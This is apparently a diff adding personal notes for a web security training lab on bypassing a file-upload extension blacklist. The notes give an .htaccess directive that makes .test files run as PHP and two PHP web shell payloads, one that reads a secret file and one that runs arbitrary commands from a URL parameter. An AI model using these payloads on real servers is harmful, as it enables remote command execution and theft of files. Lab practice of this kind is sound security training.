@@ -1,0 +1,23 @@
+Web shell upload via extension blacklist bypass
+Goal: Bypass blacklist defense and upload a PHP webshell to exfiltrate the contents of the file /home/carlos/secret
+wiener:peter
+
+1)
+-login
+-uploads of various extensions doesn't work
+
+2)
+-upload .htaccess file, allows you to make config changes on a per directory basis.
+-upload shell.test
+
+.htaccess
+AddType application/x-httpd-php .test
+
+shell
+-Payload Option
+shell.test
+<?php echo file_get_contents('/home/carlos/secret');?>
+
+Payload Option
+shell.test
+<?php system($_GET['cmd']);?>
